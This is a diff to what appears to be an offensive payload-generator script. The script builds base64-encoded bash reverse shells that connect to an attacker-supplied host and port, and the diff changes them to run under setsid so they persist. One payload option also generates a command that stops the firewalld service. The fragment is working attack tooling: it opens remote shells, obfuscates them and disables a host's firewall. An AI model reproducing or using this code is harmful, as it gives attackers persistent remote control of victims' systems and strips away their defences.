@@ -75,7 +75,7 @@ print("\033[1;35 ")
 payload=input("frsf(choose payload)#> ")
 if payload=="a" or payload=="A":
 	additional=click.prompt("ENTER ANY ADDITIONAL DIALOGUES WHEN EXECUTING :", type=str, default="")
-	rshell=f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
+	rshell=f"setsid bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
 	encodedrshell=base64.b64encode(rshell.encode("utf-8"))
 	encodedrshells=encodedrshell.decode("utf-8")
 	print(f"GENERATING PAYLOAD >>> {output}/{name}.sh")
@@ -88,7 +88,7 @@ elif payload=="b" or payload=="B":
 	firewalls="systemctl stop firewalld &> /dev/null"
 	firewall=base64.b64encode(firewalls.encode("utf-8"))
 	firewalld=firewall.decode("utf-8")
-	rshell=f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
+	rshell=f"setsid bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
 	encodedrshell=base64.b64encode(rshell.encode("utf-8"))
 	encodedrshells=encodedrshell.decode("utf-8")
 	print(f"GENERATING PAYLOAD >>> {output}/{name}.sh")
